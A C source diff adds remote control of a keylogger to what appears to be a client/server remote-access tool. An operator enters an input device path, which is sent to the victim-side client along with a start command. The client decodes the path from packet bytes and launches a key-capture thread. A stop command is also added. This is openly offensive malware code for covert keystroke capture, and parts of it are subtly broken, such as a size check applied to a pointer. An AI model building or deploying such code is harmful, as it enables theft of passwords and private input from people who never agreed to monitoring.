@@ -178,13 +178,53 @@ void handle_packet_data(struct session_info * session_info, struct packet_data *
  *
 **/
 
+// NOLINTNEXTLINE
 void start_keylogger(struct session_info * session_info) {
     log_message("Starting Keylogger");
+    const struct packet_data * packet_data = session_info->head;
+
+    session_info->device_path = malloc(MESSAGE_BUFFER_LENGTH);
+    int device_path_len = 0;
+
+    while (packet_data != NULL) {
+        const uint8_t first_byte  = (packet_data->data >> 8) & 0xFF;
+        const uint8_t second_byte = (packet_data->data) & 0xFF;
+
+        if (first_byte == START_KEYLOGGER && second_byte == START_KEYLOGGER) {
+            break;
+        }
+
+        if (device_path_len < (int)sizeof(session_info->device_path) - 2) {
+            if (first_byte == 0) {
+                session_info->device_path[device_path_len++] = (char)second_byte;
+            } else {
+                session_info->device_path[device_path_len++] = (char)first_byte;
+                session_info->device_path[device_path_len++] = (char)second_byte;
+            }
+        }
+
+        packet_data = packet_data->next;
+    }
+
+    while (device_path_len > 0 && (session_info->device_path[device_path_len - 1] == '\0' || session_info->device_path[device_path_len - 1] == ' ')) {
+        device_path_len--;
+    }
+
+    session_info->device_path[device_path_len] = '\0';
+
+    log_message("Provided Device Path: %s", session_info->device_path);
+#ifdef CLIENT_BUILD
+    if (!session_info->run_keylogger) {
+        pthread_create(&session_info->keylogger_thread, NULL, capture_keys, session_info);
+    }
+#endif
 }
 
 void stop_keylogger(struct session_info * session_info) {
     log_message("Stoping Keylogger");
+#ifdef CLIENT_BUILD
     session_info->run_keylogger = false;
+#endif
 }
 
 // NOLINTNEXTLINE
@@ -418,13 +458,56 @@ void handle_disconnect(struct session_info * session_info) {
 
 // NOLINTNEXTLINE
 void send_start_keylogger(struct server_options * server_options) {
+    const size_t device_path_length = MESSAGE_BUFFER_LENGTH;
+    char * device_path = malloc(device_path_length);
+    long bytes_read = 0;
 
+    const int flags = fcntl(STDIN_FILENO, F_GETFL, 0);
+    if (flags == -1) {
+        fprintf(stderr, "F_GETFL on STDIN\n");
+        free(device_path);
+        return;
+    }
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags & ~O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+        free(device_path);
+        return;
+    }
+
+    char discard;
+    while (read(STDIN_FILENO, &discard, 1) > 0) {
+        if (discard == '\n') break;
+    }
+
+    fprintf(stdout, "Enter the device path to log (i.e. /dev/input/event9): ");
+    fflush(stdout);
+
+    bytes_read = read(STDIN_FILENO, device_path, device_path_length);
+    if (bytes_read > 0) {
+        device_path[bytes_read - 1] = '\0';
+        printf("Listening to device path: %s\n", device_path);
+        fflush(stdout);
+
+        // Send over the filename and the FILENAME command
+        send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, device_path);
+        usleep(500000);
+        send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, START_KEYLOGGER);
+
+        fflush(stdout);
+    }
+
+    free(device_path);
+
+    if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
+        fprintf(stderr, "F_SETFL on STDIN\n");
+    }
 }
 
 
 // NOLINTNEXTLINE
 void send_stop_keylogger(struct server_options * server_options) {
-
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, STOP_KEYLOGGER);
 }
 
 // NOLINTNEXTLINE
